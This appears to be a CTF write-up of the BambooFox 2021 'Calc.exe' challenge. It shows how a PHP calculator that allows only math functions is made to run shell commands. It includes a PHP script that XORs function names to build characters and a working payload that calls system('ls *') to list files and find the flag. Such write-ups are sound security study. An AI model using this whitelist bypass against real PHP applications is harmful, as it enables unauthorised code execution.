---
title: "CTF Web Collection"
categories:
  - CTF
tags:
  - ctf
---

## PHP Eval with math function only (Calc.exe - BambooFox CTF 2021)
We got a simple calculator app based on PHP and it will catch the `_GET['expression']` parameter as our input.

<a href="/assets/images/ctf/bamboo/1.png"><img src="/assets/images/ctf/bamboo/1.png"></a>

Let's see the source code, maybe we found something useful. 

<a href="/assets/images/ctf/bamboo/2.png"><img src="/assets/images/ctf/bamboo/2.png"></a>

There is a `/source` there, let's check it out.

<a href="/assets/images/ctf/bamboo/3.png"><img src="/assets/images/ctf/bamboo/3.png"></a>

So, we got the source code. It's simply filtering almost all but we can use the math functions that leads to code execution.

So i use this payload from [here](https://www.anquanke.com/post/id/220813#h3-2) to find the right math function to produce strings / codes that we want.

```php
<!DOCTYPE html>
<html>
<body>

<?php
$whitelist = [ 'abs' , 'acos' , 'acosh' , 'asin' , 'asinh' , 'atan2' , 'atan' , 'atanh' , 'base_convert' , 'bindec' , 'ceil' , 'cos ' , 'cosh' , 'decbin' , 'dechex' , 'decoct' , 'deg2rad' , 'exp' , 'expm1' , 'floor' , 'fmod', 'getrandmax' , 'hexdec' , 'hypot', 'is_finite' , 'is_infinite' , 'is_nan' , 'lcg_value' , 'log10' , 'log1p' , 'log' , 'max' , 'min' , 'mt_getrandmax' , 'mt_rand' , 'mt_srand' , ' octdec' , 'pi' , 'pow' , 'rad2deg' , 'rand' , 'round' , 'sin' , 'sinh' , 'sqrt' , 'srand' , 'tan' , 'tanh']; 
$whitelist2 = [ 'acos' , 'acosh' , 'asin' , 'asinh' , 'atan2' , 'atan' , 'atanh' , 'base_convert' , 'bindec' , 'ceil' , 'cos' , 'cosh' , 'decbin' , 'dechex' , 'decoct' , 'deg2rad' , 'exp' , 'expm1' , 'floor' , 'fmod' ,'getrandmax' , 'hexdec' , 'hypot' ,'is_finite' , 'is_infinite' , 'is_nan' , 'lcg_value' , 'log10' , 'log1p' , 'log' , 'max' , 'min' , 'mt_getrandmax' , 'mt_rand' , 'mt_srand' , 'octdec ' , 'pi' , 'pow' , 'rad2deg' , 'rand' , 'round' , 'sin' , 'sinh' , 'sqrt', 'srand' , 'tan' , 'tanh' ,'abs' ];

foreach ($whitelist as $i): foreach ($whitelist2 as $k): echo $k^$i^ "*" ; echo " " . $i. " " . $k; echo "<br/>" ; endforeach ; endforeach ;




?>
```

The result for producing the " *" (including the space). I need it because i want to run `system(ls *)`.

<a href="/assets/images/ctf/bamboo/4.png"><img src="/assets/images/ctf/bamboo/4.png"></a>

So we got `10 sin pi` (for example). The `10` is on hexadecimal. 

<a href="/assets/images/ctf/bamboo/5.png"><img src="/assets/images/ctf/bamboo/5.png"></a>

We can use `dechex` function to produce the `10`. Let's try running it on the real website.

<a href="/assets/images/ctf/bamboo/6.png"><img src="/assets/images/ctf/bamboo/6.png"></a>

So we just need to produce `system` and `ls` with math function. Here i use `base_convert` to produce the strings. 

<a href="/assets/images/ctf/bamboo/7.png"><img src="/assets/images/ctf/bamboo/7.png"></a>
<a href="/assets/images/ctf/bamboo/8.png"><img src="/assets/images/ctf/bamboo/8.png"></a>

So, let's use all the payload we generate before. It's looks something like this `base_convert(1751504350,10,36)(base_convert(784,10,36).(dechex(16)^asinh^pi)`.

<a href="/assets/images/ctf/bamboo/9.png"><img src="/assets/images/ctf/bamboo/9.png"></a>

So we got no flag. I found the flag is on the `/` directory.

<a href="/assets/images/ctf/bamboo/10.png"><img src="/assets/images/ctf/bamboo/10.png"></a>

Let's cat the flag!

<a href="/assets/images/ctf/bamboo/11.png"><img src="/assets/images/ctf/bamboo/11.png"></a>

